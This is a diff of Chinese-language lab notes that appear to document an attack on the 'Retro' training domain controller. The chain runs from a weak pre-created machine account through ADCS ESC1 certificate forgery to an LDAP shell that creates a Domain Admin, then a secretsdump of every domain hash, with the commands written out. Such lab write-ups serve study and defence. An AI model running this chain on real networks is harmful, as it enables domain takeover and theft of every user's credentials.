@@ -1,25 +1,52 @@
 ## Retro
 
 ```
-这台 Windows 域靶机的本质是：
-利用证书模板漏洞（AD CS）→ 冒充 Administrator → 但 Kerberos 不支持 → 改用 LDAP → 新建域管用户 → 用新用户 dump 全域 hash
-
 certipy auth -pfx administrator.pfx
 KDC_ERR_PADATA_TYPE_NOSUPP //不支持你用这种证书方式走 Kerberos;
 原因：域控配置不支持 PKINIT（证书 Kerberos 登录）
+```
+#### 弱密码 / 预创建计算机账户 → 重置机器账户密码 → ADCS ESC1 → 伪造管理员证书 → LDAP Shell → 新建域管 → dump 全域 hash
+```
+倒推：
+1 NetExec（nxc）：nxc = crackmapexec 的现代重写版：登录验证/枚举/shares / users / modules；验证 Guest 空密码是否能 SMB 登录
+2 (READ)表示非默认共享
+3 Important.txt 的信息价值：“bundle every one of you up into one account”多学员一个共享密码
+4 Impacket = AD 攻击工具底层库：通过 SAMR RPC 接口，修改 AD 中某个账户的密码；rpc-samr 是Windows 远程账户管理协议
+5 nxc ldap -M adcs 的意义：用于 确认 certipy 结论的真实性
+6 ESC1 —— Retro 的致命点：任意机器账户可以申请证书
+7 banking$ + SID → 伪造管理员证书
+8 Kerberos 铁规则KRB_AP_ERR_SKEW 
+sudo ntpdate retro.vl
+9 certipy + pfx → LDAP Shell → 创建域管用户
+certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44 -ldap-shell
+【administrator.pfx = 可用于 Kerberos / LDAP 的身份凭据】
+LDAP Shell：
+add_user
+change_password
+add_user_to_group Domain Admins
+10【在域控上，用管理员权限直接改了 AD 数据库】
+secretsdump.py retro.vl/pwned:'P@ssw0rd123!'@10.129.234.44 -just-dc
+【AD dump 手法：-just-dc 是关键：ntds.dit；krbtgt；所有用户 NTLM hash】
+```
+```
+【Retro 攻击模型】
 
-用 LDAP，当管理员，直接改域
-从域控直接 dump 出整个域的 hash（包括 Administrator、krbtgt）
-1️⃣ 找到 AD CS 漏洞（Certipy find）
-2️⃣ 用机器/低权账号申请“管理员证书”
-3️⃣ certipy auth 试 Kerberos
-   ├─ 成功 → ptt / secretsdump
-   └─ 失败 → 直接 ldap-shell
-4️⃣ ldap-shell：
-   - add_user
-   - change_password
-   - add_user_to_group Domain Admins
-5️⃣ 用新用户 secretsdump
+初始入口
+└─ 预创建计算机账户（BANKING$）
+   └─ 弱初始密码 / 可 RPC 修改
+
+横向能力
+└─ ADCS 枚举
+   └─ ESC1（机器账户可伪造身份）
+
+权限提升
+└─ 伪造 Administrator 证书
+   └─ LDAP Shell
+      └─ 新建域管
+
+后渗透
+└─ secretsdump
+└─ 全域 hash
 ```
 
 ```
